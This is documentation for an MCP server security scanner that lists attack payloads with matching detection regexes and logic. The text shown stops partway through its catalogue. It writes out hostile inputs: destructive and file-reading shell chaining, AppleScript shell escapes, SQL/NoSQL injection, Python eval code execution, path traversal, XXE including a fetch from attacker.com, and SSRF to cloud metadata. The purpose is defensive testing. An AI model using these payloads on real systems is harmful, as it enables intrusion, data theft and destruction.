# Security Patterns Catalog

## Overview

This catalog documents the **31 security attack patterns** used by the MCP Inspector to assess MCP server security. Each pattern includes attack vectors, example payloads, detection logic, and validation against the vulnerability testbed.

**Version**: 1.24.2
**Pattern Count**: 31 attack categories
**Total Payloads**: 149 distinct payloads (updated with AppleScript injection)
**Risk Levels**: HIGH (103+), MEDIUM (17+), LOW (5)

**Core Principles**:

- **Pure Behavior Detection**: Analyzes actual tool responses, not metadata flags
- **Zero False Positives**: Domain-specific patterns avoid misclassifying safe tools
- **Evidence-Based**: Requires execution evidence, not just pattern matching
- **Defense-in-Depth**: Multi-layer validation (MCP errors, reflection, execution, safe categories)

---

## Table of Contents

1. [Critical Injection Patterns (7)](#critical-injection-patterns)
   - [1. Command Injection](#1-command-injection)
   - [2. AppleScript Command Injection](#2-applescript-command-injection)
   - [3. SQL Injection](#3-sql-injection)
   - [4. Calculator Injection](#4-calculator-injection)
   - [5. Path Traversal](#5-path-traversal)
   - [6. XXE Injection](#6-xxe-injection-xml-external-entity)
   - [7. NoSQL Injection](#7-nosql-injection)

2. [Input Validation Patterns (3)](#input-validation-patterns)
   - [8. Type Safety](#8-type-safety)
   - [9. Boundary Testing](#9-boundary-testing)
   - [10. Required Fields](#10-required-fields)

3. [Protocol Compliance Patterns (2)](#protocol-compliance-patterns)
   - [11. MCP Error Format](#11-mcp-error-format)
   - [12. Timeout Handling](#12-timeout-handling)

4. [Tool-Specific Patterns (7)](#tool-specific-patterns)
   - [13. Indirect Prompt Injection / SSRF](#13-indirect-prompt-injection--ssrf)
   - [14. Unicode Bypass](#14-unicode-bypass)
   - [15. Nested Injection](#15-nested-injection)
   - [16. Package Squatting](#16-package-squatting)
   - [17. Data Exfiltration](#17-data-exfiltration)
   - [18. Configuration Drift](#18-configuration-drift)
   - [19. Tool Shadowing](#19-tool-shadowing)

5. [Resource Exhaustion Patterns (1)](#resource-exhaustion-patterns)
   - [20. DoS/Resource Exhaustion](#20-dosresource-exhaustion)

6. [Deserialization Patterns (1)](#deserialization-patterns)
   - [21. Insecure Deserialization](#21-insecure-deserialization)

7. [Token Theft Patterns (1)](#token-theft-patterns)
   - [22. Token Theft](#22-token-theft)

8. [Permission Scope Patterns (1)](#permission-scope-patterns)
   - [23. Permission Scope](#23-permission-scope)

9. [Code Execution Patterns (1)](#code-execution-patterns)
   - [24. Code Execution](#24-code-execution-language-aware)

10. [Session Management Patterns (1)](#session-management-patterns)

- [25. Session Management](#25-session-management)

11. [Additional Security Patterns (6)](#additional-security-patterns)

- [26. Tool Output Injection](#26-tool-output-injection-issue-103-challenge-8)
- [27. Secret Leakage](#27-secret-leakage-issue-103-challenge-9)
- [28. Blacklist Bypass](#28-blacklist-bypass-issue-103-challenge-11)
- [29. Auth Bypass](#29-auth-bypass-issue-75)
- [30. Cross-Tool State Bypass](#30-cross-tool-state-bypass-issue-92)
- [31. Chained Exploitation](#31-chained-exploitation-issue-93)

12. [Detection Architecture](#detection-architecture)
13. [Zero False Positive Design](#zero-false-positive-design)
14. [Adding New Patterns](#adding-new-patterns)
15. [Testbed Validation](#testbed-validation)

---

## Critical Injection Patterns

### 1. Command Injection

**Attack Vector**: Tests if tools execute system commands via shell injection rather than treating input as safe parameters.

**Risk Level**: HIGH
**Payload Count**: 5
**Target Tools**: System command executors, process managers, shell wrappers

#### Payloads

| ID  | Payload              | Evidence Pattern                                           | Description                                            |
| --- | -------------------- | ---------------------------------------------------------- | ------------------------------------------------------ |
| 1.1 | `whoami`             | `/\b(root\|user\|admin)\b/i`                               | System identity command - detects username in response |
| 1.2 | `ls -la`             | `/(total\|drwx\|rwx\|-rw-\|permissions\|directory)/i`      | Directory listing - detects file metadata              |
| 1.3 | `pwd`                | `/\/[a-z]+/i`                                              | Working directory - detects Unix paths                 |
| 1.4 | `; rm -rf /`         | `/(deleted\|removed\|rm.*rf)/i`                            | Command chaining - detects destructive operations      |
| 1.5 | `\| cat /etc/passwd` | `/(root:x:\|file.*protocol.*executed\|local.*file.*ran)/i` | Pipe to file access - detects passwd file content      |

#### Expected Vulnerable Response

```json
{
  "result": "Command executed: root"
}
```

**Vulnerability Indicators**:

- System username returned (root, user, admin)
- Directory listing format (drwxr-xr-x)
- Unix paths in response (/home/user)
- Execution verbs ("executed", "ran")

#### Expected Safe Response

```json
{
  "result": "Command received and logged",
  "safe": true
}
```

**Safe Indicators**:

- Reflection patterns ("stored", "received")
- No execution evidence
- MCP validation errors (-32602)

#### Detection Logic

```typescript
// Step 1: Check for MCP validation errors (highest priority)
if (errorCode === -32602) {
  return { safe: true, evidence: "MCP validation error" };
}

// Step 2: Check for reflection (safe echo)
if (/stored.*query|received.*parameter/.test(response)) {
  return { safe: true, evidence: "Safe reflection" };
}

// Step 3: Check for execution evidence
if (/\b(root|user|admin)\b/.test(response)) {
  return { vulnerable: true, evidence: "Command executed" };
}
```

#### Domain-Specific Detection

**Safe Categories** (automatically excluded):

- Search/Retrieval tools: Return query results, not execute commands
- CRUD Creation tools: Create resources, not execute code
- Read-Only Info tools: Return user data (intended exposure)

**Testbed Validation**:

- `vulnerable_system_exec_tool`: 7 detections (whoami → "root")
- `safe_storage_tool_mcp`: 0 detections (whoami → "Command received")

---

### 2. AppleScript Command Injection

**Attack Vector**: Tests if tools execute arbitrary AppleScript/osascript commands via string interpolation.

**Risk Level**: HIGH (3), MEDIUM (1)
**Payload Count**: 4
**Target Tools**: macOS automation tools, AppleScript executors, osascript wrappers

#### Payloads

| ID  | Payload                                     | Evidence Pattern                            | Description                            |
| --- | ------------------------------------------- | ------------------------------------------- | -------------------------------------- |
| 2.1 | `" & do shell script "id" & "`              | `/uid=\d+\|gid=\d+\|\broot\b(?=:\|\s\|$)/i` | Double-quote escape to shell execution |
| 2.2 | `' & do shell script 'whoami' & '`          | `/uid=\d+\|gid=\d+\|\broot\b(?=:\|\s\|$)/i` | Single-quote escape variant            |
| 2.3 | `osascript -e 'return (system info)'`       | `/processor\|memory\|system.*version/i`     | System info extraction (MEDIUM risk)   |
| 2.4 | `" & do shell script "cat /etc/passwd" & "` | `/root:.*:0:0\|\/bin\/(ba)?sh/i`            | File read via shell escape             |

#### Expected Vulnerable Response

```json
{
  "result": "uid=501(user) gid=20(staff)",
  "executed": true
}
```

**Vulnerability Indicators**:

- User/group ID output (uid=N, gid=N)
- System information disclosure
- File contents from shell commands
- Root user detection

#### Expected Safe Response

```json
{
  "result": "Script received and stored",
  "safe": true
}
```

**Safe Indicators**:

- Reflection patterns ("stored", "received")
- No execution evidence
- MCP validation errors (-32602)
- AppleScript parsing errors

#### Detection Logic

```typescript
// Step 1: Check for MCP validation errors (highest priority)
if (errorCode === -32602) {
  return { safe: true, evidence: "MCP validation error" };
}

// Step 2: Check for reflection (safe echo)
if (/stored.*script|received.*command/.test(response)) {
  return { safe: true, evidence: "Safe reflection" };
}

// Step 3: Check for execution evidence (tightened regex)
if (/uid=\d+|gid=\d+|\broot\b(?=:|\s|$)/.test(response)) {
  return { vulnerable: true, evidence: "AppleScript command executed" };
}
```

#### Enhanced Detection: Issue #174 Fix

**Problem Solved**: False positives when responses contain words like "uid", "root", or "gid" in non-execution contexts.

**Evidence Regex Refinement**:

| Old Pattern                       | New Pattern                                             | Improvement                                      |
| --------------------------------- | ------------------------------------------------------- | ------------------------------------------------ |
| `/uid\|gid\|root\|user\|whoami/i` | `/uid=\d+\|gid=\d+\|\broot\b(?=:\|\s\|$)\|whoami\s*$/i` | Tightened to match actual command output formats |

**Distinguishing Safe vs Vulnerable**:

| Response Type        | Example                         | Vulnerable? | Detection Logic                                |
| -------------------- | ------------------------------- | ----------- | ---------------------------------------------- |
| **Execution Output** | `"uid=501(user) gid=20(staff)"` | ✅ YES      | Matches `uid=\d+` pattern                      |
| **Safe Text**        | `"Invalid uid parameter"`       | ❌ NO       | Word "uid" without `=\d+` format               |
| **Safe Text**        | `"root directory not found"`    | ❌ NO       | Word "root" not followed by `:`, space, or end |

**Implementation**: `injectionPatterns.ts` lines 72, 80 (evidence regex refinement)

#### Enhanced Detection: Issue #177 Fix (False Negative Prevention)

**Problem Solved**: False negatives when AppleScript injection successfully escapes quotes but produces runtime errors.

**Background**: H1 report #3480575 identified a critical RCE where the payload `" & do shell script "id" &"` successfully escaped string context and reached shell execution, but was marked safe because AppleScript error -2710 appeared in the response.

**The Issue**:

- Issue #175 fix (XXE false positive prevention) was too aggressive
- It dismissed ALL AppleScript errors as "safe", including injection SUCCESS cases
- Need to distinguish: syntax error (safe) vs runtime error after injection (vulnerable)

**New Detection Flow**:

```typescript
// Step 1: Check for injection SUCCESS patterns FIRST
if (isAppleScriptInjectionSuccess(response, payload)) {
  // Payload successfully escaped quotes to shell - vulnerable regardless of subsequent errors
  return { vulnerable: true, evidence: "AppleScript quote escape to shell" };
}

// Step 2: THEN check for syntax errors (Issue #175 fix)
if (isAppleScriptSyntaxError(response)) {
  return { safe: true, evidence: "AppleScript syntax error (no execution)" };
}
```

**Injection Success Patterns** (7 patterns):

| Pattern               | Example                                       | Description                                      |
| --------------------- | --------------------------------------------- | ------------------------------------------------ |
| Quote escape to shell | `" & do shell script "id"`                    | Double-quote escape with shell command           |
| Quote escape to shell | `' & do shell script 'id'`                    | Single-quote escape with shell command           |
| Shell script result   | `uid=123(user) gid=456(staff)`                | Shell command output indicates injection success |
| Shell access          | Response contains `do shell script` execution | Shell script execution confirmed                 |
| Command execution     | `id` command output patterns                  | Unix command results in response                 |
| Runtime error context | Error -2710, -2763 (Word/app not running)     | Error AFTER injection point, not before          |
| Injection artifacts   | Quote manipulation patterns in response       | Evidence of string context escape                |

**Runtime Error Codes** (4 patterns):

| Error Code | Description                | Injection Status             |
| ---------- | -------------------------- | ---------------------------- |
| -2710      | Microsoft Word not running | AFTER injection (vulnerable) |
| -2763      | Application isn't running  | AFTER injection (vulnerable) |
| -10810     | Application not found      | AFTER injection (vulnerable) |
| -600       | Application not responding | AFTER injection (vulnerable) |

**Distinguishing Safe vs Vulnerable Errors**:

| Error Type                          | Example                                                                                                | Vulnerable? | Detection Logic                                                   |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------ | ----------- | ----------------------------------------------------------------- |
| **Syntax Error**                    | `Expected end of line but found identifier`                                                            | ❌ NO       | Payload never parsed - no execution                               |
| **Runtime Error (after injection)** | `Microsoft Word got an error: Application isn't running. (-2710)` + payload `" & do shell script "id"` | ✅ YES      | Payload escaped quotes, error occurred AFTER shell access attempt |
| **Safe Reflection**                 | `Script received: " & do shell script "id" & "`                                                        | ❌ NO       | Payload stored as string, no parsing                              |

**Implementation**:

- `SecurityPatternLibrary.ts`: APPLESCRIPT_INJECTION_SUCCESS_PATTERNS (7 patterns), APPLESCRIPT_RUNTIME_ERROR_CODES (4 patterns)
- `SecurityResponseAnalyzer.ts`: checkSafeErrorResponses() now checks injection success BEFORE dismissing errors
- `SafeResponseDetector.ts`: Updated to pass payload parameter for injection context analysis

**Regression Prevention**: Issue #175 fix (XXE false positives) is preserved - syntax errors WITHOUT injection patterns are still marked safe.

---

### 3. SQL Injection

**Attack Vector**: Tests if tools properly escape SQL commands or execute them directly via string concatenation.

**Risk Level**: HIGH
**Payload Count**: 4
**Target Tools**: Database query tools, SQL executors, ORM wrappers

#### Payloads

| ID  | Payload                             | Evidence Pattern                                                 | Description                                     |
| --- | ----------------------------------- | ---------------------------------------------------------------- | ----------------------------------------------- |
| 2.1 | `'; DROP TABLE users;--`            | `/(dropped\|deleted\|table.*users\|sql.*error\|syntax.*error)/i` | SQL command injection - table deletion          |
| 2.2 | `' OR '1'='1`                       | `/(sql\|query\|select\|where.*1.*1\|syntax.*error)/i`            | Boolean-based injection - authentication bypass |
| 2.3 | `admin'--`                          | `/(sql.*executed\|admin.*query\|syntax.*error)/i`                | Comment-based injection - query termination     |
| 2.4 | `' UNION SELECT * FROM passwords--` | `/(union.*select\|password\|sql.*error\|syntax.*error)/i`        | UNION-based injection - data exfiltration       |

#### Expected Vulnerable Response

```json
{
  "result": "SQL executed: dropped table users",
  "rowsAffected": 1
}
```

**Vulnerability Indicators**:

- SQL execution keywords ("executed", "query ran")
- Table operation results ("dropped", "deleted")
- SQL error messages (syntax errors during execution)

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Parameter validation failed: invalid query syntax"
  }
}
```

**Safe Indicators**:

- MCP validation errors (-32602)
- Parameterized query patterns
- SQL escape confirmation

#### Detection Logic

```typescript
// Check for SQL execution evidence
if (/dropped|deleted|table.*users/.test(response)) {
  return { vulnerable: true, evidence: "SQL injection executed" };
}

// Check for validation rejection
if (/validation failed.*invalid query/.test(response)) {
  return { safe: true, evidence: "Query validation rejected" };
}
```

#### Testbed Validation

**Vulnerable Server**:

- `vulnerable_calculator_tool` with SQL payload: 4 detections

**Hardened Server**:

- Same tool: 0 detections (parameterized queries)

---

### 4. Calculator Injection

**Attack Vector**: Tests if calculator/math tools execute arbitrary expressions via `eval()` instead of safely parsing them.

**Risk Level**: HIGH
**Payload Count**: 7
**Target Tools**: Calculator tools, expression evaluators, math parsers

#### Payloads

| ID  | Payload                                         | Evidence Pattern                     | Description                         |
| --- | ----------------------------------------------- | ------------------------------------ | ----------------------------------- |
| 3.1 | `2+2`                                           | `/The answer is 4/i`                 | Simple arithmetic - triggers eval() |
| 3.2 | `5*5`                                           | `/The answer is 25/i`                | Multiplication expression           |
| 3.3 | `100+200`                                       | `/The answer is 300/i`               | Addition with larger numbers        |
| 3.4 | `what is 10*10`                                 | `/The answer is 100/i`               | Natural language math query         |
| 3.5 | `calculate 50+50`                               | `/The answer is 100/i`               | Calculate command                   |
| 3.6 | `__import__('os').system('whoami')`             | `/\b(root\|user\|admin\|ubuntu)\b/i` | Python code injection via eval      |
| 3.7 | `1+1; __import__('subprocess').run(['whoami'])` | `/\b(root\|user\|admin\|ubuntu)\b/i` | eval chain to system command        |

#### Expected Vulnerable Response

```json
{
  "result": "The answer is 4",
  "computed": true
}
```

**Vulnerability Indicators**:

- Computed results ("The answer is X")
- Execution of mathematical operations
- System commands executed via Python eval

#### Expected Safe Response

```json
{
  "result": "Expression received and stored",
  "safe": true
}
```

**Safe Indicators**:

- Reflection patterns ("stored", "received")
- No computed results
- Math library parsing (not eval)

#### Detection Logic

```typescript
// Check for computed result patterns
if (/The answer is \d+/.test(response)) {
  // Verify it's not just echoing the input
  if (!response.includes(payload)) {
    return { vulnerable: true, evidence: "Expression evaluated" };
  }
}

// Check for command execution via eval
if (/\b(root|user|admin)\b/.test(response)) {
  return { vulnerable: true, evidence: "Code execution via eval" };
}
```

#### Domain-Specific Detection

**Calculator Tool Pattern**: Tools with "calc", "math", "compute" in name/description are tested more rigorously.

**Testbed Validation**:

- `vulnerable_calculator_tool`: 24 detections (eval enabled)
- `safe_storage_tool_mcp`: 0 detections (stores expressions as strings)

#### Enhanced Detection: Issue #14 Fix (v1.22.0)

**Problem Solved**: False positives when tools safely sanitize input with hash-based identifiers.

The enhanced detection distinguishes three response types:

| Response Type         | Example                                  | Vulnerable? | Detection Logic                    |
| --------------------- | ---------------------------------------- | ----------- | ---------------------------------- |
| **Execution**         | `"The answer is 655"` (from `15*37+100`) | ✅ YES      | Computed result differs from input |
| **Safe Echo**         | `"Expression stored: 15*37+100"`         | ❌ NO       | Original expression reflected      |
| **Safe Sanitization** | `"Expression stored: [ref-5e8c42f1]"`    | ❌ NO       | Hash-based identifier pattern      |

**Computed Result Detection** (`isComputedMathResult`):

```typescript
// Detects when math is computed vs echoed
// Payload: "15*37+100"
// Vulnerable: Response contains "655" but NOT "15*37+100"
// Safe: Response contains "15*37+100" (echoed, not computed)
```

**Hash-Based Sanitization Patterns** (10 new patterns):

| Pattern              | Example                          | Description                 |
| -------------------- | -------------------------------- | --------------------------- |
| `[ref-xxxxxxxx]`     | `"Stored: [ref-5e8c42f1]"`       | Hash identifier replacement |
| `[sanitized]`        | `"Input: [sanitized]"`           | Sanitization placeholder    |
| `[redacted]`         | `"Content: [redacted]"`          | Redaction placeholder       |
| `[filtered]`         | `"Query: [filtered]"`            | Filter placeholder          |
| `[blocked]`          | `"Command: [blocked]"`           | Block placeholder           |
| `Expression stored:` | `"Expression stored: ..."`       | Storage prefix pattern      |
| `Input sanitized`    | `"Input sanitized successfully"` | Sanitization confirmation   |
| `Content replaced`   | `"Content replaced with hash"`   | Replacement confirmation    |

**Implementation**: `SecurityAssessor.ts` lines 883-891 (computed result check), lines 1671-1681 (sanitization patterns)

---

### 5. Path Traversal

**Attack Vector**: Tests if tools allow access to files outside intended directory via `../` sequences.

**Risk Level**: HIGH
**Payload Count**: 4
**Target Tools**: File access tools, path validators, file readers

#### Payloads

| ID  | Payload                                      | Evidence Pattern                                                | Description                |
| --- | -------------------------------------------- | --------------------------------------------------------------- | -------------------------- |
| 4.1 | `../../../etc/passwd`                        | `/(root:x:0:0\|file.*accessed\|passwd.*file)/i`                 | Unix path traversal        |
| 4.2 | `..\\..\\..\\windows\\system32\\config\\sam` | `/(\[boot loader\]\|sam.*file\|system32)/i`                     | Windows path traversal     |
| 4.3 | `/etc/passwd`                                | `/(root:x:0:0\|file.*accessed)/i`                               | Absolute path access       |
| 4.4 | `file:///etc/passwd`                         | `/(root:x:\|file.*protocol.*executed\|local.*file.*accessed)/i` | File protocol exploitation |

#### Expected Vulnerable Response

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

**Vulnerability Indicators**:

- passwd file format (username:x:uid:gid)
- Windows config file markers ([boot loader])
- File access confirmation messages

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Path validation failed: directory traversal detected"
  }
}
```

**Safe Indicators**:

- Path validation errors
- Canonicalization rejection
- Sandboxed file access

#### Detection Logic

```typescript
// Check for passwd file content
if (/root:x:0:0/.test(response)) {
  return { vulnerable: true, evidence: "File accessed via path traversal" };
}

// Check for path validation
if (/path validation failed/.test(response)) {
  return { safe: true, evidence: "Path traversal blocked" };
}
```

#### Testbed Validation

**Vulnerable Server**:

- `vulnerable_data_leak_tool`: 7 detections (file access)

**Hardened Server**:

- Same tool: 0 detections (path validation)

---

### 6. XXE Injection (XML External Entity)

**Attack Vector**: Tests if tools process XML external entities, allowing file disclosure or SSRF.

**Risk Level**: HIGH
**Payload Count**: 5
**Target Tools**: XML parsers, SOAP handlers, XML data processors

#### Payloads

| ID  | Payload                                                                                                                 | Evidence Pattern                                                            | Description                           |
| --- | ----------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- | ------------------------------------- |
| 5.1 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`                       | `/(root:x:0:0\|xxe.*processed\|external.*entity.*loaded\|file.*contents)/i` | XXE file disclosure via SYSTEM entity |
| 5.2 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`               | `/(\[fonts\]\|\[extensions\]\|xxe.*processed\|windows.*file.*accessed)/i`   | XXE Windows file disclosure           |
| 5.3 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>` | `/(ami-id\|instance-id\|xxe.*fetched\|metadata.*accessed\|ssrf.*xml)/i`     | XXE SSRF to AWS metadata              |
| 5.4 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`       | `/(dtd.*loaded\|parameter.*entity\|external.*dtd\|xxe.*processed)/i`        | Blind XXE via parameter entity        |
| 5.5 | `<?xml version="1.0"?><soap:Envelope...><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...</soap:Envelope>`  | `/(root:x:0:0\|soap.*xxe\|xxe.*soap\|external.*entity)/i`                   | XXE in SOAP envelope                  |

#### Expected Vulnerable Response

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Vulnerability Indicators**:

- File contents in response
- External entity processing messages
- SSRF requests to internal services

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "XML external entity processing disabled"
  }
}
```

**Safe Indicators**:

- XXE disabled in parser config
- Entity processing blocked
- Echoed XML without evaluation

#### Detection Logic

```typescript
// Check if response contains echoed XXE payload (safe reflection)
if (/<!DOCTYPE.*ENTITY/.test(response) && /stored.*query/.test(response)) {
  return { safe: true, evidence: "XML stored without entity processing" };
}

// Check for file content disclosure
if (/root:x:0:0/.test(response)) {
  return { vulnerable: true, evidence: "XXE file disclosure" };
}
```

#### Parameter Targeting

Payloads target parameters: `["xml", "data", "body", "payload", "content", "soap"]`

---

### 7. NoSQL Injection

**Attack Vector**: Tests if tools are vulnerable to NoSQL injection attacks (MongoDB, Redis, etc.).

**Risk Level**: HIGH (7), MEDIUM (1)
**Payload Count**: 8
**Target Tools**: NoSQL database tools, MongoDB clients, Redis clients

#### Payloads

| ID  | Payload                                           | Evidence Pattern                                                                             | Description                         |
| --- | ------------------------------------------------- | -------------------------------------------------------------------------------------------- | ----------------------------------- |
| 6.1 | `{"$gt": ""}`                                     | `/(all.*documents\|query.*executed\|mongodb.*error\|operator.*injection\|nosql.*executed)/i` | MongoDB $gt operator injection      |
| 6.2 | `{"$ne": null}`                                   | `/(returned.*all\|bypass.*auth\|nosql.*injection\|query.*result\|documents.*found)/i`        | MongoDB $ne bypass injection        |
| 6.3 | `{"$where": "this.password.match(/.*/)"}`         | `/(javascript.*executed\|\$where.*processed\|nosql.*js\|all.*passwords\|query.*executed)/i`  | MongoDB $where JavaScript injection |
| 6.4 | `{"$regex": "^(a+)+$"}`                           | `/(regex.*executed\|redos\|timeout\|catastrophic.*backtracking\|query.*slow)/i`              | MongoDB ReDoS via $regex (MEDIUM)   |
| 6.5 | `admin', $or: [ {}, { 'a': 'a`                    | `/(admin.*returned\|auth.*bypass\|or.*injection\|nosql.*executed)/i`                         | MongoDB $or injection bypass        |
| 6.6 | `test\r\nCONFIG GET *\r\n`                        | `/(redis.*config\|requirepass\|maxmemory\|save.*seconds\|redis.*command.*executed)/i`        | Redis CRLF command injection        |
| 6.7 | `EVAL "return redis.call('INFO')" 0`              | `/(redis_version\|used_memory\|connected_clients\|lua.*executed)/i`                          | Redis Lua script injection          |
| 6.8 | `{"selector": {"$or": [{"_id": {"$gt": null}}]}}` | `/(all.*documents\|couchdb.*query\|selector.*executed\|documents.*returned)/i`               | CouchDB selector injection          |

#### Expected Vulnerable Response (MongoDB $ne)

```json
{
  "users": [
    { "id": 1, "username": "admin" },
    { "id": 2, "username": "user" }
  ],
  "message": "Authentication bypassed - all users returned"
}
```

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Invalid query: operator injection detected"
  }
}
```

#### Detection Logic

```typescript
// Check for operator injection execution
if (/all.*documents|authentication bypassed/.test(response)) {
  return { vulnerable: true, evidence: "NoSQL operator injection" };
}

// Check for validation rejection
if (/operator injection detected/.test(response)) {
  return { safe: true, evidence: "NoSQL injection blocked" };
}
```

#### Parameter Targeting

Payloads target parameters: `["query", "filter", "where", "search", "data", "username", "password"]`

---

## Input Validation Patterns

### 8. Type Safety

**Attack Vector**: Tests if tools validate parameter types correctly.

**Risk Level**: MEDIUM (2), LOW (1)
**Payload Count**: 3
**Target Tools**: All tools with typed parameters

#### Payloads

| ID  | Payload           | Evidence Pattern                                                      | Description               | Risk   |
| --- | ----------------- | --------------------------------------------------------------------- | ------------------------- | ------ |
| 7.1 | `not_a_number`    | `/(type.*error\|invalid.*type\|expected.*number\|cannot.*convert)/i`  | String instead of number  | MEDIUM |
| 7.2 | `999999999999999` | `/(overflow\|out.*of.*range\|exceeds.*maximum\|number.*too.*large)/i` | Numeric overflow          | MEDIUM |
| 7.3 | `true`            | `/(type.*error\|invalid.*type\|expected.*string\|cannot.*convert)/i`  | Boolean instead of string | LOW    |

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Parameter validation failed: expected number, got string"
  }
}
```

**Safe Indicator**: MCP validation error (-32602) before processing

#### Detection Logic

```typescript
// Check for MCP validation error (SAFE)
if (errorCode === -32602) {
  return { safe: true, evidence: "MCP validation error" };
}

// Check for type mismatch patterns (SAFE - validation working)
if (/type.*error|invalid.*type/.test(response)) {
  // Only safe if NO execution evidence follows
  if (!this.hasExecutionEvidence(response)) {
    return { safe: true, evidence: "Type validation working" };
  }
}
```

**Critical Distinction**:

- **SAFE**: "type error" in validation message → rejected before execution
- **VULNERABLE**: "type error" in execution result → error during execution

---

### 9. Boundary Testing

**Attack Vector**: Tests edge cases and boundary conditions.

**Risk Level**: MEDIUM (1), LOW (2)
**Payload Count**: 3

#### Payloads

| ID  | Payload             | Evidence Pattern                                                              | Description                | Risk   |
| --- | ------------------- | ----------------------------------------------------------------------------- | -------------------------- | ------ |
| 8.1 | `""` (empty)        | `/(empty.*not.*allowed\|required\|cannot.*be.*empty\|must.*not.*be.*empty)/i` | Empty string validation    | LOW    |
| 8.2 | `"A".repeat(10000)` | `/(too.*long\|exceeds.*length\|maximum.*length\|length.*limit)/i`             | Maximum length validation  | MEDIUM |
| 8.3 | `-1`                | `/(negative.*not.*allowed\|must.*be.*positive\|invalid.*value)/i`             | Negative number validation | LOW    |

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Parameter validation failed: cannot be empty"
  }
}
```

---

### 10. Required Fields

**Attack Vector**: Tests if tools validate required parameters.

**Risk Level**: MEDIUM
**Payload Count**: 1

#### Payload

| ID  | Payload            | Evidence Pattern                                                          | Description             |
| --- | ------------------ | ------------------------------------------------------------------------- | ----------------------- |
| 9.1 | `MISSING_REQUIRED` | `/(required\|missing.*parameter\|field.*required\|parameter.*required)/i` | Missing required fields |

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Missing required parameter: username"
  }
}
```

---

## Protocol Compliance Patterns

### 11. MCP Error Format

**Attack Vector**: Verifies errors follow MCP protocol specification.

**Risk Level**: LOW
**Payload Count**: 1

#### Payload

```javascript
{
  payload: "INVALID_TRIGGER_ERROR",
  evidence: /(isError|error|invalid|failed)/i
}
```

**Purpose**: Validates that tools return proper MCP error structures with `isError: true` or error codes.

---

### 12. Timeout Handling

**Attack Vector**: Tests if tools handle long operations gracefully.

**Risk Level**: LOW
**Payload Count**: 1

#### Payload

```javascript
{
  payload: "SIMULATE_LONG_OPERATION",
  evidence: /(timeout|timed.*out|exceeded.*time|operation.*timeout)/i
}
```

**Purpose**: Ensures tools don't hang indefinitely and return proper timeout errors.

---

## Tool-Specific Patterns

### 13. Indirect Prompt Injection / SSRF

**Attack Vector**: Tests if tools fetch external content or allow SSRF attacks against internal services.

**Risk Level**: HIGH
**Payload Count**: 18
**Target Tools**: HTTP fetchers, URL processors, content scrapers

#### Payload Categories

**1. Benign URL Fetch (3 payloads)**:

- `http://example.com` - Status 200 detection
- `http://evil.com/inject.txt` - Malicious domain detection

**2. SSRF - Local Services (3 payloads)**:

- `http://localhost` - localhost access
- `http://127.0.0.1:6379` - Redis service
- `http://127.0.0.1:3306` - MySQL service

**3. SSRF - Cloud Metadata (3 payloads)**:

- `http://169.254.169.254/latest/meta-data/` - AWS metadata
- `http://169.254.169.254/computeMetadata/v1/project/project-id` - GCP metadata
- `http://169.254.169.254/metadata/instance` - Azure metadata

**4. SSRF - Internal Networks (2 payloads)**:

- `http://192.168.1.1` - Internal network
- `http://10.0.0.1` - Private network (10.x)

**5. SSRF - File Protocol (1 payload)**:

- `file:///etc/passwd` - file:// protocol abuse

**6. DNS Rebinding Attacks (8 payloads)**:

- `http://rebind.network/dnsbin` - Generic rebind domain
- `http://a]@127.0.0.1/` - URL parser confusion
- `http://127.0.0.1.nip.io` - nip.io wildcard DNS
- `http://169.254.169.254.nip.io/latest/meta-data/` - AWS metadata via nip.io
- `http://0x7f000001` - Hexadecimal IP encoding
- `http://2130706433` - Decimal IP encoding
- `http://[::ffff:127.0.0.1]` - IPv6 mapped IPv4
- `http://spoofed.burpcollaborator.net` - Out-of-band interaction

#### Expected Vulnerable Response (AWS Metadata)

```json
{
  "result": "SSRF attempted: http://169.254.169.254/latest/meta-data/",
  "metadata": {
    "ami-id": "ami-12345678",
    "instance-id": "i-0abcdef1234567890"
  }
}
```

#### Expected Safe Response

```json
{
  "result": "URL received: http://169.254.169.254/latest/meta-data/",
  "safe": true
}
```

**Safe Indicators**:

- URL validation errors
- Reflection patterns ("URL received")
- IP allowlist rejection

#### Detection Logic

```typescript
// Check for SSRF evidence
if (/SSRF.*attempted|ami-id|instance-id/.test(response)) {
  return { vulnerable: true, evidence: "SSRF to cloud metadata" };
}

// Check for reflection
if (/URL received/.test(response)) {
  return { safe: true, evidence: "URL stored without fetching" };
}
```

#### Parameter Targeting

Payloads target parameters: `["url", "uri", "link", "endpoint", "address"]`

#### Testbed Validation

- `vulnerable_fetcher_tool`: 13 detections (HTTP requests made)
- `safe_storage_tool_mcp`: 0 detections (URLs stored as strings)

---

### 14. Unicode Bypass

**Attack Vector**: Tests if tools decode and execute unicode-encoded commands.

**Risk Level**: MEDIUM
**Payload Count**: 2

#### Payloads

| ID   | Payload                                         | Evidence Pattern                                               | Description                    |
| ---- | ----------------------------------------------- | -------------------------------------------------------------- | ------------------------------ |
| 13.1 | `\u0077\u0068\u006f\u0061\u006d\u0069` (whoami) | `/(root\|user\|admin\|decoded.*executed\|unicode.*executed)/i` | Unicode-encoded system command |
